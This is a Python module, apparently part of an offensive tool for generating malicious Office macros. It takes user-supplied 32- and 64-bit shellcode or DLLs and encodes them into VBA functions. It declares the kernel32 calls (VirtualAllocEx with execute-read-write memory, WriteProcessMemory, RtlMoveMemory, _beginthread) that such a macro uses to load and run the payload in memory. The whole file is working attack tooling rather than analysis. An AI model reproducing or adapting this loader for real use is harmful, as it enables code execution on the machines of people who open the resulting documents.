
from lib.interfaces.module_interface import ModuleInterface
from lib.validators.files import isreadable
from lib.validators.generic import ischoice
from lib.tab_completers.generic import tab_choice
from data.scripts.BinaryToVbaFunc import BinaryToVbaFunc


class Template(ModuleInterface):
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        self.encodings = { "0": "-", "6": "!" }
        options['memorymode'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "memory writing function (move or process)",
            "tab_complete": tab_choice,
            "tab_args": {'choices': ['move', 'process']},
            "validator": ischoice,
            "validatorargs": {'choices': ['move', 'process']},
            "handler": None
        }
        options['shellcode_x86'] = {
            "value": None,
            "required": False,
            "description": "path to 32-bit shellcode (can't be used with dll_x86)",
            "tab_complete": self.helpers.complete_path,
            "validator": isreadable,
            "handler": None
        }
        options['shellcode_x64'] = {
            "value": None,
            "required": False,
            "description": "path to 64-bit shellcode (can't be used with dll_x64)",
            "tab_complete": self.helpers.complete_path,
            "validator": isreadable,
            "handler": None
        }
        options['dll_x86'] = {
            "value": None,
            "required": False,
            "description": "path to 32-bit dll to encode into shellcode (can't be used with shellcode_x86)",
            "tab_complete": self.helpers.complete_path,
            "validator": isreadable,
            "handler": None
        }
        options['dll_x64'] = {
            "value": None,
            "required": False,
            "description": "path to 64-bit dll to encode into shellcode (can't be used with shellcode_x64)",
            "tab_complete": self.helpers.complete_path,
            "validator": isreadable,
            "handler": None
        }
        super().__init__(templatePath, options)
    # end __init__

    def preprocess(self):
        # Check to see if both dll and shellcode are set (not allowed)
        if ((self.options['dll_x86']['value'] is not None and self.options['shellcode_x86']['value'] is not None) \
        or (self.options['dll_x64']['value'] is not None and self.options['shellcode_x64']['value'] is not None)):
            raise RuntimeError("Can only set dll or shellcode(s)")
        # Check to see if at least one dll or shellcode are set (at least 1 required)
        if (self.options['dll_x86']['value'] is None and self.options['dll_x64']['value'] is None \
        and self.options['shellcode_x86']['value'] is None and self.options['shellcode_x64']['value'] is None):
            raise RuntimeError("Must set dll or shellcode(s)")
        
        
        # If dll_x86 payload is set, generate the patched dll for the x86 shellcode payload buffer
        if self.options['dll_x86']['value'] is not None:
            shellcode_x86 = self.helpers.stager.generate_patched_dll(self.options['dll_x86']['value'], arch='x86', type=None)
        # Else shellcode_x86 is set, so just read in the shellcode for the x86 shellcode payload buffer
        elif self.options['shellcode_x86']['value'] is not None:
            with open(self.options['shellcode_x86']['value'], 'rb') as fPayload:
                shellcode_x86 = fPayload.read()
        # Else no payload for 32-bit
        else:
            # Use a NOP otherwise BinaryToVbaFunc errors with "input_binary is empty"
            shellcode_x86 = b'\x90'
            
        # If dll_x64 payload is set, generate the patched dll for the x64 shellcode payload buffer
        if self.options['dll_x64']['value'] is not None:
            shellcode_x64 = self.helpers.stager.generate_patched_dll(self.options['dll_x64']['value'], arch='x64', type=None)
        # Else shellcode_x64 is set, so just read in the shellcode for the x64 shellcode payload buffer
        elif self.options['shellcode_x64']['value'] is not None:
            with open(self.options['shellcode_x64']['value'], 'rb') as fPayload:
                shellcode_x64 = fPayload.read()
        # Else no payload for 64-bit
        else:
            # Use a NOP otherwise BinaryToVbaFunc errors with "input_binary is empty"
            shellcode_x64 = b'\x90'

        # Set up the declares
        self.declares.add('Private Const MEM_COMMIT = &H1000')
        self.declares.add('Private Const PAGE_EXECUTE_READWRITE = &H40')
        self.declares.add('Private Declare PtrSafe Function m_IsWow64Process Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As LongPtr, ByRef Wow64Process As Long) As Boolean')
        self.declares.add('Private Declare PtrSafe Sub m_RtlMoveMemory Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As LongPtr)')
        self.declares.add('Private Declare PtrSafe Function m_VirtualAllocEx Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr')
        self.declares.add('Private Declare PtrSafe Function m_VirtualProtectEx Lib "kernel32" Alias "VirtualProtectEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long')
        self.declares.add('Private Declare PtrSafe Function m_WriteProcessMemory Lib "kernel32.dll" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As Boolean')
        self.declares.add('Private Declare PtrSafe Function m_beginthread Lib "msvcrt" Alias "_beginthread" (ByVal lpStartAddress As LongPtr, ByVal dwStackSize As Long, ByVal lpArgList As LongPtr) As LongPtr')

         # Generate the shellcode functions from the buffers
        self.options['shellcode_x86_func'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the x86 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['shellcode_x86_func']['value'] = BinaryToVbaFunc(
            shellcode_x86, 
            'getShellcode_x86', 
            self.encodings
        )
        self.options['shellcode_x64_func'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the x64 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['shellcode_x64_func']['value'] = BinaryToVbaFunc(
            shellcode_x64, 
            'getShellcode_x64', 
            self.encodings
        )
    # end preprocess
    
    def postprocess(self):
        # Remove the generated shellcode functions from the options
        del self.options['shellcode_x86_func']
        del self.options['shellcode_x64_func']
    # end postprocess
